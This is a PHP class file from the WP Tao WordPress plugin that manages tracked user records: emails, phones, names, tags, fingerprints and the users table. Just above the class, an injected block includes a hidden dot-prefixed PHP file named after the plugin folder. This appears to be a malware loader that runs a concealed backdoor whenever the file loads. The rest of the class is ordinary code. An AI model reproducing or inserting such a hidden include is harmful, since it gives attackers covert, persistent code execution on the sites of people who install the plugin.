<?php

/**
 * User
 *
 * The class handles storage of users's data
 *
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Users extends WTBP_WPTAO_DB {
	/*
	 * Identified User ID (or false if none)
	 */

	private $user_id;

	/*
	 * Fingerprint ID (or false if none)
	 */
	private $fingerprint_id;

	/*
	 * Has been identified?
	 */
	private $identified_now;

	/**
	 * WTBP_WPTAO_Users Constructor.
	 */
	public function __construct() {

		global $wpdb;

		parent::__construct();

		$this->table_name	 = $wpdb->prefix . 'wptao_users';
		$this->version		 = '1.1';
		$this->primary_key	 = 'id';

		add_action( 'init', array( $this, 'set_current_fingerprint_and_user' ), 6 );
		add_action( 'init', array( $this, 'check_user' ) );

		$this->identified_now = false;

		add_action( 'wptao_user_identified', array( $this, 'user_created_ts_update' ) );

		add_filter( 'wptao_before_user_add', array( $this, 'user_data_validate_phone' ) );
	}

	/*
	 * Set current fingerprint
	 * 
	 * @since 1.1.9.3
	 */

	public function set_current_fingerprint_and_user() {

		$this->fingerprint_id	 = TAO()->fingerprints->get_id();
		$this->user_id			 = TAO()->fingerprints->get_user_id();
	}

	/*
	 * If necessary, create a new user or updated data.
	 */

	function check_user() {

		// Have fingerprint but is not identified - try to identify
		if ( !$this->user_id && $this->fingerprint_id ) {

			if ( is_user_logged_in() ) {
				$user	 = wp_get_current_user();
				$data	 = array(
					'email'		 => $user->user_email,
					'first_name' => $user->first_name,
					'last_name'	 => $user->last_name,
					'options'	 => array(
						'allow_switch_user' => true
					)
				);
				$this->maybe_create_user( $data );
			}
		} else if ( $this->user_id ) {
			$this->update_last_active();
		}
	}

	/**
	 * Create new user or update existing user data
	 *
	 * @param array user data
	 * 
	 * @return bool|int false on error or user id (new / existing) on success
	 */
	public function add( $user_data ) {

		$user_data = apply_filters( 'wptao_before_user_add', $user_data );

		$create = false;

		if ( !empty( $user_data[ 'email' ] ) ) {
			$user = $this->get_by( 'email', $user_data[ 'email' ] );
			if ( $user ) {
				$this->update_user( $user, $user_data );
				return $user->id;
			}

			$create = true;
		}

		if ( !empty( $user_data[ 'phone' ] ) ) {
			$user = $this->get_by( 'phone', $user_data[ 'phone' ] );
			if ( $user ) {
				$this->update_user( $user, $user_data );
				return $user->id;
			}

			$create = true;
		}

		// not enought data - email or phone are mandatory
		if ( !$create ) {
			return false;
		}

		if ( !isset( $user_data[ 'created_ts' ] ) ) {
			$user_data[ 'created_ts' ] = $this->ts_now;
		}
		if ( !isset( $user_data[ 'last_active_ts' ] ) ) {
			$user_data[ 'last_active_ts' ] = 0;
		}
		return $this->create_user( $user_data );
	}

	/**
	 * Create new user (without checking if user already exists etc.)
	 *
	 * @param array user data
	 * 
	 * @return bool|int false on error or new user id on success
	 */
	private function create_user( $user_data ) {
		if ( isset( $user_data[ 'id' ] ) ) {
			unset( $user_data[ 'id' ] );
		}

		if ( isset( $user_data[ 'email' ] ) && (!isset( $user_data[ 'status' ] ) || empty( $user_data[ 'status' ] )) ) {
			$user_data[ 'status' ] = $this->determine_status( $user_data[ 'email' ] );
		}

		$user_id = $this->insert( $user_data );

		// meta values
		if ( $user_id !== false && isset( $user_data[ 'meta' ] ) && is_array( $user_data[ 'meta' ] ) ) {

			TAO()->users_meta->add_multi( $user_id, $user_data[ 'meta' ] );
		}

		return $user_id;
	}

	/**
	 * Update user
	 *
	 * @param object user_old
	 * @param array user_new
	 * @param bool if true overwrite otherwise update empty fields
	 */
	public function update_user( $user_old, $user_new, $overwrite = false ) {
		if ( !$overwrite ) {
			foreach ( $user_old as $uk => $uv ) {
				if ( !empty( $uv ) ) {
					$user_new[ $uk ] = $uv;
				}
			}
		}

		if ( isset( $user_new[ 'email' ] ) ) {
			if ( !isset( $user_old->email ) || $user_new[ 'email' ] != $user_old->email ) {
				$user_new[ 'status' ] = $this->determine_status( $user_new[ 'email' ] );
			}
		}

		$user_id = $user_old->id;

		$update_user = $this->update( $user_id, $user_new );

		// meta values
		$update_meta = true;
		if ( $user_id !== false && !empty( $user_new[ 'meta' ] ) && is_array( $user_new[ 'meta' ] ) ) {
			$update_meta = TAO()->users_meta->add_multi( $user_id, $user_new[ 'meta' ], true );
		}

		if ( $update_user && $update_meta ) {
			return true;
		}

		return false;
	}

	/**
	 * Check if user exists and create new one if not
	 *
	 * @param array user data
	 * 
	 * @return bool|int false on error or exist / new user id on success
	 */
	public function maybe_create_user( $user_data ) {

		// is it allowed to create new user if fingerprint is not definied? Default: yes (true)
		if ( isset( $user_data[ 'options' ][ 'allow_no_fingerptint' ] ) && false === $user_data[ 'options' ][ 'allow_no_fingerptint' ] ) {
			if ( empty( $this->fingerprint_id ) ) {
				return false;
			}
		}

		// is it allowed to create new user if user is already identified? Default: no (false)
		if ( isset( $user_data[ 'options' ][ 'only_not_identified' ] ) && true === $user_data[ 'options' ][ 'only_not_identified' ] ) {
			if ( $this->identified() ) {
				return false;
			}
		}

		$user_data[ 'last_active_ts' ] = $this->ts_now;
		if ( empty( $this->fingerprint_id ) ) {
			$user_data[ 'created_ts' ] = 0; // not identified yet
		}
		$user_id = $this->add( $user_data );

		if ( !$user_id ) {
			return false;
		}

		if ( empty( $this->user_id ) && !empty( $this->fingerprint_id ) ) {
			$this->user_id	 = $user_id;
			$identified_data = array(
				'user_id'	 => $user_id,
				'event'		 => isset( $user_data[ 'options' ][ 'event' ] ) ? $user_data[ 'options' ][ 'event' ] : '',
				'event_args' => isset( $user_data[ 'options' ][ 'event_args' ] ) ? $user_data[ 'options' ][ 'event_args' ] : array()
			);
			do_action( 'wptao_user_identified', $identified_data );
		}

		// is it allowed to switch to newly identified user? Default: no (false)
		if ( isset( $user_data[ 'options' ][ 'allow_switch_user' ] ) && true === $user_data[ 'options' ][ 'allow_switch_user' ] ) {
			if ( $user_id != TAO()->users->get_id() ) {
				TAO()->users->reset_user( $user_id );
			}
		}

		return $user_id;
	}

	/**
	 * Update user referer
	 *
	 * @param int $user_id
	 * 
	 * @return bool true on success, false otherwise
	 * 
	 * @since 1.2.2
	 */
	public function update_referer( $user_id = false ) {
		global $wpdb;

		if ( empty( $user_id ) ) {
			$user_id = $this->user_id;
		}

		if ( empty( $user_id ) ) {
			return false;
		}

		$events_table = TAO()->events->table_name;

		$event = $wpdb->get_row( $wpdb->prepare( "SELECT id, value FROM $events_table WHERE action = 'pageview' AND user_id = %d ORDER BY event_ts ASC LIMIT 1;", $user_id ) );

		if ( empty( $event ) ) {
			return false;
		}

		$event_meta = TAO()->events_meta->get_meta( $event->id, true );

		if ( !empty( $event_meta[ 'referer' ] ) ) {
			TAO()->users_meta->update_meta( $user_id, 'referer', $event_meta[ 'referer' ] );
		}

		$url = $event->value;
		if ( !empty( $event_meta[ 'query' ] ) ) {
			$url .= '/?' . $event_meta[ 'query' ];
		}

		TAO()->users_meta->update_meta( $user_id, 'first_url', $url );

		return true;
	}

	/**
	 * Update last active timestam for current user
	 */
	public function update_last_active() {
		// @todo: optimize (limit 1)
		$this->update( $this->user_id, array( 'last_active_ts' => $this->ts_now ) );
	}

	/**
	 * Get user ID
	 *
	 * @access public
	 * @return bool|int false or The user ID
	 */
	public function get_id() {
		return $this->user_id;
	}

	/**
	 * Check if user is identified
	 *
	 * @access public
	 * @return bool true if user is identified, false otherwise
	 */
	public function identified() {
		return !empty( $this->user_id );
	}

	/**
	 * Reset user
	 *
	 * @access public
	 * @param int user ID
	 */
	public function reset_user( $user_id ) {

		TAO()->fingerprints->reset_fingerprint( $user_id );
		$this->user_id			 = $user_id;
		$this->fingerprint_id	 = TAO()->fingerprints->get_id();
	}

	/*
	 * Display name
	 * 
	 * @param mixed - user_id, email, array or object with user info
	 * @return string Display name
	 */

	public function display_name( $mixed ) {

		$name	 = '';
		$object	 = NULL;

		if ( is_array( $mixed ) ) {
			$mixed = (object) $mixed;
		}

		if ( is_string( $mixed ) && is_email( $mixed ) ) {

			$name = WTBP_WPTAO_Helpers::email_to_name( $mixed );
		}

		if ( is_numeric( $mixed ) ) {

			$user_id = (int) $mixed;
			$object	 = $this->get( $user_id );
		}


		// Get name from user info object
		if ( is_object( $mixed ) || is_object( $object ) ) {

			$object = is_numeric( $mixed ) ? $object : $mixed;

			if ( isset( $object->first_name ) && !empty( $object->first_name ) ) {
				$name = sanitize_text_field( $object->first_name );
			}
			if ( isset( $object->last_name ) && !empty( $object->last_name ) ) {
				$name .= ' ' . sanitize_text_field( $object->last_name );
			}
		}

		// Not definded first_name or last_name
		if ( empty( $name ) ) {

			if ( empty( $user_id ) ) {
				$user_id = isset( $object->id ) ? absint( $object->id ) : '';
			}

			if ( isset( $object->email ) && is_email( $object->email ) ) {
				$name = WTBP_WPTAO_Helpers::email_to_name( $object->email );
			} else {
				$name = sprintf( __( 'Unknown name (%d)', 'wp-tao' ), $user_id );
			}
		}


		return $name;
	}

	/*
	 * Display avatar
	 * 
	 * @param mixed - user_id, email, array or object with user info
	 * @param int - size in px
	 * @param string - default type @see wp-includes/pluggable.php function get_avatar()
	 * @return string Display name
	 */

	public function get_avatar( $mixed, $size = 32, $type = 'identicon' ) {

		$avatar_id	 = '';
		$object		 = NULL;
		$status		 = '';

		if ( is_array( $mixed ) ) {
			$mixed = (object) $mixed;
		}

		if ( is_string( $mixed ) || is_string( $mixed ) && is_email( $mixed ) ) {
			$avatar_id = $mixed;
		}

		if ( is_numeric( $mixed ) ) {
			$user_id = (int) $mixed;
			$object	 = $this->get( $user_id );
		}


		// Get avatar id from user info object
		if ( is_object( $mixed ) || is_object( $object ) ) {

			$object = is_numeric( $mixed ) ? $object : $mixed;

			if ( isset( $object->email ) && !empty( $object->email ) ) {
				$avatar_id = $object->email;
			} else {
				if ( isset( $object->id ) && !empty( $object->id ) ) {
					$avatar_id = $object->id;
				}
			}

			if ( isset( $object->status ) ) {
				$status = $object->status;
			}
		}

		switch ( $status ) {
			case 'blacklist':
				$type = WTBP_WPTAO_URL . 'assets/images/black.png';
				break;

			case 'invalid':
				$type = WTBP_WPTAO_URL . 'assets/images/red.png';
				break;

			case 'disposable':
				$type = WTBP_WPTAO_URL . 'assets/images/orange.png';
				break;

			default:
				break;
		}

		return get_avatar( $avatar_id, $size, $type );
	}

	/*
	 * Determine email status
	 * 
	 * @param string - email
	 * @return string - status: valid, invalid, disposable
	 * 
	 * @since 1.1.3
	 */

	public function determine_status( $email ) {
		$validator = new WTBP_WPTAO_Email_Validator();
		if ( !$validator->isSendable( $email ) ) {
			$status = 'invalid';
		} else if ( $validator->isDisposable( $email ) ) {
			$status = 'disposable';
		} else {
			$status = 'valid';
		}

		return apply_filters( 'wptao_users_email_determine_status', $status, $email );
	}

	/*
	 * Parse status to human readable format
	 * 
	 * @param string - status: valid, invalid, disposable
	 * @param bool html - if true adds html tags
	 * @return string - parsed status
	 * 
	 * @since 1.1.8
	 */

	public function parse_status( $status_in, $html = false ) {

		switch ( $status_in ) {
			case 'valid':
				$status_out = __( 'Valid', 'wp-tao' );
				break;

			case 'disposable':
				$status_out = __( 'Disposable', 'wp-tao' );
				break;

			case 'invalid':
				$status_out = __( 'Invalid', 'wp-tao' );
				break;

			case 'blacklist':
				$status_out = __( 'Blacklisted', 'wp-tao' );
				break;

			default:
				$status_out = __( 'Undeterminied', 'wp-tao' );
		}

		if ( $html ) {
			$status_out = '<span class="wptao-email-status wptao-email-status-' . $status_in . '">' . $status_out . '</span>';
		}

		return apply_filters( 'wptao_users_email_parse_status', $status_out, $status_in, $html );
	}

	/*
	 * Delete ALL users meta which have no associated event
	 * @since 1.1.8
	 */

	public function delete_users_meta() {
		global $wpdb;

		$u		 = $this->table_name;
		$u_meta	 = TAO()->users_meta->table_name;

		$sql_delete_meta = "
			DELETE $u_meta FROM $u_meta
			LEFT JOIN $u
		    ON $u.id = $u_meta.user_id
			WHERE $u.id IS NULL";
		$wpdb->query( $sql_delete_meta );
	}

	/**
	 * Update user created ts if current is 0
	 * 
	 * @since 1.2.2.1
	 */
	public function user_created_ts_update( $identified_data ) {
		global $wpdb;

		$this->identified_now = true;

		$user_id = absint( $identified_data[ 'user_id' ] );

		$wpdb->query( $wpdb->prepare( "UPDATE $this->table_name SET created_ts = %d WHERE id = %d AND created_ts = 0 LIMIT 1", $this->ts_now, $user_id ) );
	}

	/**
	 * Check whether the user has been identified 
	 * 
	 * @since 1.2.2.2
	 */
	public function has_been_identified() {
		return $this->identified_now;
	}

	/**
	 * Update user's tags
	 * 
	 * @param array $tags - array of tags
	 * 
	 * @since 1.2.4
	 */
	public function update_tags( $tags, $user_id = false ) {

		if ( empty( $user_id ) ) {
			$user_id = $this->user_id;
		}

		if ( empty( $user_id ) ) {
			return;
		}

		$tags_id		 = array();
		$tags_imploded	 = $this->get_column( 'tags', $user_id );
		if ( !empty( $tags_imploded ) ) {
			$tags_id = explode( ',', $tags_imploded );
		}

		foreach ( $tags as $tag ) {
			$tid = TAO()->users_tags->get_id( $tag );
			if ( false === $tid ) {
				$tid = TAO()->users_tags->add( $tag );
			}

			$tags_id[] = $tid;
		}

		//sort( $tags_id, SORT_NUMERIC );
		$tags_id_imploded = implode( ',', $tags_id );

		$this->update( $user_id, array( 'tags' => $tags_id_imploded ) );
	}

	/**
	 * Parse tags ids to tags
	 * 
	 * @param string $tags_id_implodes - imploded ids of tags
	 * 
	 * @return array $tags
	 * 
	 * @since 1.2.4
	 */
	public function parse_tags( $tags_id_imploded ) {

		$tags = array();

		if ( empty( $tags_id_imploded ) ) {
			return $tags;
		}

		$tags_id = explode( ',', $tags_id_imploded );

		foreach ( $tags_id as $tag_id ) {
			if ( empty( $tags[ $tag_id ] ) ) {
				$trow = TAO()->users_tags->get( $tag_id );
				if ( !empty( $trow ) ) {
					$tags[ $tag_id ] = array( 'tag' => $trow->tag, 'count' => 1 );
				}
			} else {
				$tags[ $tag_id ][ 'count' ] = $tags[ $tag_id ][ 'count' ] + 1;
			}
		}

		return $tags;
	}

	/**
	 * Validate phone number filter
	 * 
	 * @param array $user_data
	 * 
	 * @return array $user_data with formatted phone number (or empty if is wrong)
	 * 
	 * @since 1.2.5
	 */
	public function user_data_validate_phone( $user_data ) {
		if ( empty( $user_data[ 'phone' ] ) ) {
			return $user_data;
		}

		$phone_no				 = $this->validate_phone( $user_data[ 'phone' ] );
		$user_data[ 'phone' ]	 = $phone_no;

		return $user_data;
	}

	/**
	 * Validate phone number
	 * 
	 * @param string $phone_no
	 * 
	 * @return string formatted phone number if is correct, empty string otherwise
	 * 
	 * @since 1.2.5
	 */
	public function validate_phone( $phone_no ) {

		try {
			$phoneNumberUtil = \libphonenumber\PhoneNumberUtil::getInstance();

			$region = null;
			if ( function_exists( 'locale_get_region' ) ) {
				$region = locale_get_region( get_locale() );
			}

			$phoneNumberObject = $phoneNumberUtil->parse( $phone_no, $region );

			if ( $phoneNumberUtil->isValidNumber( $phoneNumberObject ) ) {
				return $phoneNumberUtil->format( $phoneNumberObject, \libphonenumber\PhoneNumberFormat::E164 );
			}
		} catch ( Exception $e ) {
			
		}

		return '';
	}

	// =============================================================================================
	// DB section
	// =============================================================================================

	/**
	 * Create the table
	 *
	 * @access  public
	 */
	public function create_table() {
		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );

		$sql = "CREATE TABLE " . $this->table_name . " (
        id bigint(20) NOT NULL AUTO_INCREMENT,
        email varchar(50) NOT NULL,
        phone varchar(20) NOT NULL,
        first_name varchar(50) NOT NULL,
        last_name varchar(50) NOT NULL,
        notes longtext NOT NULL,
        created_ts int(11) NOT NULL,
        last_active_ts int(11) NOT NULL,
		status varchar(16) NOT NULL,
		tags VARCHAR(255) NOT NULL DEFAULT '',
        PRIMARY KEY  (id),
		KEY email (email)
        ) CHARACTER SET utf8 COLLATE utf8_general_ci;";

		dbDelta( $sql );

		update_option( $this->table_name . '_db_version', $this->version );
	}

	/**
	 * Get columns and formats
	 *
	 * @access  public
	 */
	public function get_columns() {
		return array(
			'id'			 => '%d',
			'email'			 => '%s',
			'phone'			 => '%s',
			'first_name'	 => '%s',
			'last_name'		 => '%s',
			'notes'			 => '%s',
			'created_ts'	 => '%d',
			'last_active_ts' => '%d',
			'status'		 => '%s',
			'tags'			 => '%s'
		);
	}

	/**
	 * Get default column values
	 *
	 * @access  public
	 */
	public function get_column_defaults() {
		return array(
			'email'			 => '',
			'phone'			 => '',
			'first_name'	 => '',
			'last_name'		 => '',
			'notes'			 => '',
			'created_ts'	 => 0,
			'last_active_ts' => 0,
			'status'		 => '',
			'tags'			 => ''
		);
	}

}
